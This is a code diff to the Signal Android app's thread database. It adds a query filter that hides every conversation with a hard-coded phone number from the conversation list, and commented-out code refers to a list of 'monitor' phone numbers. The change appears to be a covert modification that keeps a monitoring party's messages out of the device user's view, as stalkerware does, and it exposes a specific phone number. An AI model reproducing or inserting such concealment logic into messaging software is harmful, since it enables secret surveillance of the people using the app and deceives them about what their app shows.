@@ -19,11 +19,15 @@ package org.thoughtcrime.securesms.database;
 
 import android.content.ContentValues;
 import android.content.Context;
+import android.content.res.Resources;
 import android.database.Cursor;
 import android.database.MergeCursor;
 import android.net.Uri;
 import android.support.annotation.NonNull;
 import android.support.annotation.Nullable;
+import android.widget.ArrayAdapter;
+
+import org.thoughtcrime.securesms.R;
 import org.thoughtcrime.securesms.logging.Log;
 
 import com.annimon.stream.Stream;
@@ -50,6 +54,7 @@ import org.whispersystems.libsignal.util.Pair;
 import org.whispersystems.libsignal.util.guava.Optional;
 
 import java.io.Closeable;
+import java.util.Arrays;
 import java.util.LinkedList;
 import java.util.List;
 import java.util.Set;
@@ -365,9 +370,18 @@ public class ThreadDatabase extends Database {
     return getConversationList("1");
   }
 
-  private Cursor getConversationList(String archived) {
+
+  //change by Yanjing
+  private Cursor getConversationList(String archived) {  //changed "!=0" to "!=0 AND 1=0" --> get conversation from database
     SQLiteDatabase db     = databaseHelper.getReadableDatabase();
-    String         query  = createQuery(ARCHIVED + " = ? AND " + MESSAGE_COUNT + " != 0", 0);
+
+
+//    String[] monitorarray = Resources.getSystem().getStringArray(R.array.monitor_phone_number); //change xml file string name to lower case
+//    List<String> monitorlist = Arrays.asList(monitorarray);
+
+
+    String         query  = createQuery(ARCHIVED + " = ? AND " + MESSAGE_COUNT + " != 0 AND " + TABLE_NAME + "." + ADDRESS + " != '+18607868900' ", 0);
+//    String         query  = createQuery(ARCHIVED + " = ? AND " + MESSAGE_COUNT + " != 0 AND " + TABLE_NAME + "." + ADDRESS + "!monitorlist.contains(ADDRESS)" , 0);
     Cursor         cursor = db.rawQuery(query, new String[]{archived});
 
     setNotifyConverationListListeners(cursor);
@@ -604,7 +618,7 @@ public class ThreadDatabase extends Database {
     return thumbnail != null ? thumbnail.getThumbnailUri() : null;
   }
 
-  private @NonNull String createQuery(@NonNull String where, int limit) {
+  private @NonNull String createQuery(@NonNull String where, int limit) {  //changed by yanjing
     String projection = Util.join(COMBINED_THREAD_RECIPIENT_GROUP_PROJECTION, ",");
     String query =
     "SELECT " + projection + " FROM " + TABLE_NAME +
